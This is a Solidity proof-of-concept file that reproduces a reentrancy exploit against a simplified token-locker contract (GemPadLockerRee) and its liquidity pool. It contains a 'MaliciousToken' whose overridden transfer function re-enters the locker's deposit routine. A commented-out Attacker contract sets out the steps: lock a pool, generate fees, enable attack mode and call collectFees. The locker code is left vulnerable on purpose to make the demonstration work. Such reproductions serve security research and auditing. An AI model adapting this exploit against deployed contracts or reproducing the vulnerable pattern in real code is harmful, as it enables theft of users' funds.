// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Simplified ERC20 interface
interface IERC20 {
    function mint(address to, uint256 value) external;
    function safeTransfer(address to, uint256 value) external;
    function safeTransferFrom(address from, address to, uint256 value) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ERC20 is IERC20 {
    constructor(uint initialSupply) {
        mint(msg.sender, initialSupply);
    }

    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowances;

    function safeTransfer(address to, uint amt) public {
        safeTransferFrom(msg.sender, to, amt);
    }

    function safeTransferFrom(
        address from,
        address to,
        uint amt
    ) public virtual {
        balances[to] += amt;
        balances[from] -= amt;
    }

    function balanceOf(address a) public view returns (uint256) {
        return balances[a];
    }

    function mint(address to, uint256 value) public virtual {
        balances[to] += value;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowances[msg.sender][spender] = amount;
        return true;
    }
}

contract GemPadLockerRee {
    struct PoolLockInfo {
        address poolAddress;
        uint unlockTime;
    }

    struct LockInfo {
        uint unlockTime;
        address token;
        uint amount;
    }

    mapping(address => PoolLockInfo) public poolLocks;
    mapping(address => LockInfo) public deposits;

    constructor() {}

    function deposit(address token, uint amount, uint duration) public {
        IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
        deposits[msg.sender] = LockInfo({
            unlockTime: block.timestamp + duration,
            token: token,
            amount: amount
        });
    }

    function withdraw() public {
        address token = deposits[msg.sender].token;
        uint amount = deposits[msg.sender].amount;
        require(
            block.timestamp >= deposits[msg.sender].unlockTime,
            "Lock period not expired"
        );
        delete deposits[msg.sender];
        IERC20(token).safeTransferFrom(address(this), msg.sender, amount);
    }

    function lock(address poolAddress, uint duration) public {
        poolLocks[msg.sender] = PoolLockInfo({
            poolAddress: poolAddress,
            unlockTime: block.timestamp + duration
        });

        //change pool ownership to this contract
        Pool(poolAddress).transferOwnership(address(this));
    }

    function unlock() public {
        address poolAddress = poolLocks[msg.sender].poolAddress;
        require(
            block.timestamp >= poolLocks[msg.sender].unlockTime,
            "Lock period not expired"
        );
        delete poolLocks[msg.sender];
        Pool(poolAddress).transferOwnership(msg.sender);
    }

    function collectFees() public {
        address poolAddress = poolLocks[msg.sender].poolAddress;
        (address tokenA, address tokenB) = Pool(poolAddress).getPoolTokens();
        uint tokenABefore = IERC20(tokenA).balanceOf(address(this));
        uint tokenBBefore = IERC20(tokenB).balanceOf(address(this));
        Pool(poolAddress).withdrawFee();
        uint tokenAAfter = IERC20(tokenA).balanceOf(address(this));
        uint tokenBAfter = IERC20(tokenB).balanceOf(address(this));
        IERC20(tokenA).safeTransferFrom(
            address(this),
            msg.sender,
            tokenAAfter - tokenABefore
        );
        IERC20(tokenB).safeTransferFrom(
            address(this),
            msg.sender,
            tokenBAfter - tokenBBefore
        );
    }
}

contract Pool {
    address tokenA;
    address tokenB;
    uint reserveA;
    uint reserveB;
    address owner;

    uint tokenAFees;
    uint tokenBFees;

    constructor(
        address _tokenA,
        address _tokenB,
        uint _reserveA,
        uint _reserveB
    ) {
        tokenA = _tokenA;
        tokenB = _tokenB;
        reserveA = _reserveA;
        reserveB = _reserveB;
        owner = msg.sender;

        // Transfer initial reserves from creator to pool
        IERC20(tokenA).safeTransferFrom(msg.sender, address(this), reserveA);
        IERC20(tokenB).safeTransferFrom(msg.sender, address(this), reserveB);
    }

    function closePool() public {
        require(msg.sender == owner, "Only owner can close the pool");

        uint feesTokenAToWithdraw = tokenAFees;
        uint feesTokenBToWithdraw = tokenBFees;

        tokenAFees = 0;
        tokenBFees = 0;

        // Return reserves to owner
        IERC20(tokenA).safeTransferFrom(
            address(this),
            msg.sender,
            reserveA + feesTokenAToWithdraw
        );
        IERC20(tokenB).safeTransferFrom(
            address(this),
            msg.sender,
            reserveB + feesTokenBToWithdraw
        );
    }

    function swap(address tokenIn, uint amountIn) public {
        bool isAin = tokenA == tokenIn;
        require(isAin || tokenB == tokenIn, "Invalid tokenIn");
        uint amountOut;
        uint inFees = amountIn / 100; // 1% fee
        if (isAin) {
            tokenAFees += inFees; // 1% fee
            // swap logic
            amountOut = (((amountIn - inFees) * reserveB) / reserveA);
            tokenBFees += (amountOut / 100); // 1% fee
            // update reserves
            reserveA += amountIn;
            reserveB -= amountOut / 100;
            IERC20(tokenA).safeTransferFrom(
                msg.sender,
                address(this),
                amountIn
            );
            IERC20(tokenB).safeTransfer(msg.sender, amountOut);
        } else {
            tokenBFees += inFees; // 1% fee
            // swap logic
            amountOut = (((amountIn - inFees) * reserveA) / reserveB);
            tokenAFees += (amountOut / 100); // 1% fee
            // update reserves
            reserveB += amountIn;
            reserveA -= amountOut / 100;
            IERC20(tokenB).safeTransferFrom(
                msg.sender,
                address(this),
                amountIn
            );
            IERC20(tokenA).safeTransfer(msg.sender, amountOut);
        }
    }

    function withdrawFee() public {
        require(tokenAFees > 0 || tokenBFees > 0, "No fees to withdraw");
        require(msg.sender == owner, "Only pool owner can withdraw fees");
        IERC20(tokenA).safeTransferFrom(address(this), msg.sender, tokenAFees);
        IERC20(tokenB).safeTransferFrom(address(this), msg.sender, tokenBFees);
    }

    function transferOwnership(address newOwner) public {
        (address token0, address token1) = tokenA < tokenB
            ? (tokenA, tokenB)
            : (tokenB, tokenA);
        tokenA = token0;
        tokenB = token1;
        require(msg.sender == owner, "Only owner can transfer ownership");
        owner = newOwner;
    }

    function getPoolTokens() public view returns (address, address) {
        return (tokenA, tokenB);
    }
}

contract MaliciousToken is ERC20 {
    bool public performAttack;
    GemPadLockerRee public locker;
    address public poolAddress;

    constructor(address _locker, uint initialSupply) ERC20(initialSupply) {
        locker = GemPadLockerRee(_locker);
    }

    function safeTransferFrom(
        address from,
        address to,
        uint amt
    ) public override {
        // ATTACK
        if (performAttack) {
            locker.deposit(address(this), 0, 0);
        }
        balances[to] += amt;
        balances[from] -= amt;
    }

    function setAttackMode(bool _performAttack) public {
        performAttack = _performAttack;
    }

    function mint(address to, uint256 value) public override {
        balances[to] += value;
    }
}

// TODO FIXME
// contract Attacker {
//     function attack(address locker, address tokenB, address pool) public {
//         // deploy MaliciousToken
//         MaliciousToken maliciousToken = new MaliciousToken(locker, 1000000);

//         // lock pool
//         GemPadLockerRee(locker).lock(pool, 1000);

//         // generate fees in the pool
//         maliciousToken.approve(pool, 10000);
//         IERC20(tokenB).approve(pool, 10000);
//         Pool(pool).swap(address(maliciousToken), 10000);

//         // set MaliciousToken to attack mode
//         maliciousToken.setAttackMode(true);

//         // call collectFees to trigger reentrancy
//         GemPadLockerRee(locker).collectFees();
//     }
// }
